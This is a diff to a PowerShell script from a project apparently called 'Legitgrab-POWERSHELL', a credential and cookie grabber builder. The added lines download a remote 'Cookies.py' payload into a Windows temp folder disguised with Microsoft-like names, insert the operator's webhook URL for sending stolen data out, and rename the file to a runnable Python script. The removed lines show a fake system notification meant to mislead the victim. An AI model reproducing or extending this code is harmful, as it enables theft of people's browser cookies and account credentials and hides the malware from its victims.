@@ -160,8 +160,16 @@ cls
 
 ######################################################################
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/asset/Cookies.py" -OutFile "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt" 
-(Get-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt) -replace 'hook = "WillBeReplaceBiUrWebHook"', $Hook | Set-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
-powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'Regedit-leak', 'You can restart your pc in 2 minutes', [System.Windows.Forms.ToolTipIcon]::None)}"
+######################################################################
+
+######################################################################
+$file = "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt"
+$targetString = "WillBeReplaceBiUrWebHook"
+$text = Get-Content $file
+$newText = $text -replace $targetString, $webhook
+$newText | Set-Content $file
+Rename-Item -Path $file -NewName "SecurityKeys.py"
+#I don't use chatGPT 
 ######################################################################
 
 ######################################################################
